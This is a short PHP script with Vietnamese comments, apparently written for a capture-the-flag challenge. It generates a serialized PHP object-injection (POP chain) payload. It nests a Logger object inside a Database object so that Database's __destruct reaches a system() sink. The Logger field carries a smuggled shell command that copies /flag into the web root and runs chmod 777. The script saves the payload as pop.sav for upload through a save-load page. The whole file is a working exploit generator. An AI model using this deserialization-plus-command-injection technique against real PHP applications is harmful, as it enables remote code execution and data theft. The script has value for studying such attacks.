<?php
#===========================================================================================================#
# SCRIPT TẠO PAYLOAD POP CHAIN DỰA TRÊN MAGIC METHOD __destruct()                                            #
# - Kịch bản: Khi ở Map 5 không có file map5.php, không có bất kỳ nút nào để gọi hàm (fight, run...).       #
# - Giải pháp: Lợi dụng Magic Method Database::__destruct() tự động chạy khi giải phóng bộ nhớ!             #
#===========================================================================================================#

// 1. Khai báo Class Logger (Gadget cuối chứa Sink system())
class Logger
{
    public $filepath;
    public function __construct($filepath)
    {
        $this->filepath = $filepath;
    }
}

// 2. Khai báo Class Database (Entry Point chứa Magic Method __destruct())
class Database
{
    public $conn;
}

// 3. Xây dựng chuỗi đối tượng lồng nhau:
// Lệnh cần thực thi: đọc file /flag và copy ra thư mục web /var/www/html/frontend/materials/flag.txt
$command = "dummy; cp /flag /var/www/html/frontend/materials/flag.txt; chmod 777 /var/www/html/frontend/materials/flag.txt";

$logger = new Logger($command);

$db = new Database();
$db->conn = $logger; // Gán thuộc tính $conn bằng đối tượng Logger

// 4. Serialize thành chuỗi văn bản:
$payload = serialize($db);

echo "=== PAYLOAD POP CHAIN (__destruct) ===\n";
echo $payload . "\n\n";

// Lưu thẳng thành file pop.sav để bạn có thể upload qua save-load.php
file_put_contents(__DIR__ . "/pop.sav", $payload);
echo "[+] Da tao file pop.sav thanh cong tai: " . __DIR__ . "/pop.sav\n";
